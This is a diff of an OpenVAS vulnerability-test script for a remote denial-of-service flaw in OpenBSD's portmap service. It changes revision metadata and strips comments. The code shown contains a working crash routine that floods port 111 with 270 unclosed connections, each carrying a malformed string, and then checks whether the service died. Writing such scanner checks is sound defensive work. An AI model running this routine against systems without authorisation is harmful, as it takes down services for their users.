@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_openbsd_portmap_dos_vuln.nasl 11374 2018-09-13 12:45:05Z asteins $
+# $Id: gb_openbsd_portmap_dos_vuln.nasl 11421 2018-09-17 06:58:23Z cfischer $
 #
 # OpenBSD Portmap Remote Denial of Service Vulnerability
 #
@@ -27,11 +27,11 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.803091");
-  script_version("$Revision: 11374 $");
+  script_version("$Revision: 11421 $");
   script_bugtraq_id(56671);
   script_tag(name:"cvss_base", value:"5.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2018-09-13 14:45:05 +0200 (Thu, 13 Sep 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-17 08:58:23 +0200 (Mon, 17 Sep 2018) $");
   script_tag(name:"creation_date", value:"2012-12-26 10:49:16 +0530 (Wed, 26 Dec 2012)");
   script_name("OpenBSD Portmap Remote Denial of Service Vulnerability");
   script_category(ACT_DENIAL);
@@ -68,7 +68,6 @@ if(description)
   exit(0);
 }
 
-
 nfsPort = get_kb_item("rpc/portmap");
 if(!nfsPort){
   nfsPort = 111;
@@ -78,7 +77,6 @@ if(!get_port_state(nfsPort)){
   exit(0);
 }
 
-##  Open tcp socket
 soc = open_sock_tcp(nfsPort);
 if(!soc){
   exit(0);
@@ -88,17 +86,12 @@ close(soc);
 
 testmsg = "8========@";
 
-## Send malformed Request Multiple times
-## Open socket for every request and don't close it
 for (i = 0; i < 270; i++)
 {
-  ##  Open tcp socket
   soc = open_sock_tcp(nfsPort);
   if(!soc){
     break;
   }
-
-  ## Send the malformed request
   send(socket:soc, data: testmsg);
 }
 
@@ -110,7 +103,6 @@ sleep(1);
 
 soc2 = open_sock_tcp(nfsPort);
 
-## If couldn't open soc then portmap is crashed
 if(!soc2){
   security_message(port:nfsPort);
   exit(0);
